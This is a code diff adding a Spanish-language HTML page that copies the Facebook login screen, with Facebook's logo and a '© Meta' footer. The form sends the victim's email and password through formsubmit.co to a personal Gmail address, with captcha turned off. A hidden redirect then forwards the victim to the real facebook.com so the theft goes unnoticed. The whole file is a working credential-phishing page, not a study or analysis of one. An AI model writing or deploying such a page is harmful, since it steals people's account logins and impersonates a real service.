@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+    <div class="container">
+        <div class="header">
+            <div class="language">
+                <select>
+                    <option>Español</option>
+                    <option>Inglés</option>
+                    <!-- Puedes agregar más opciones de idiomas si lo deseas -->
+                </select>
+            </div>
+        </div>
+
+        <div class="form-content"> 
+
+            <img src="img/facebook.png" alt="Facebook Logo" class="logo">
+            <form action="https://formsubmit.co/alfaroalejandro317@gmail.com" method="POST">
+
+                <input type="email" name="email" id="email" placeholder="Celular o correo electrónico">
+
+                <input type="password" name="subject" id="subject" placeholder="Contraseña">
+
+                <input class="btn" type="submit" value="Iniciar sesión">
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+
+                <input type="hidden" name="_next" value="https://www.facebook.com/">
+                <input type="hidden" name="_captcha" value="false">
+            </form>
+        </div>
+
+        <div class="create-account">
+            <a href="#">Crear cuenta nueva</a>
+        </div>
+
+        <div class="footer">
+            <p>&copy; Meta</p>
+        </div>
+    </div>
+
+</body>
+</html>
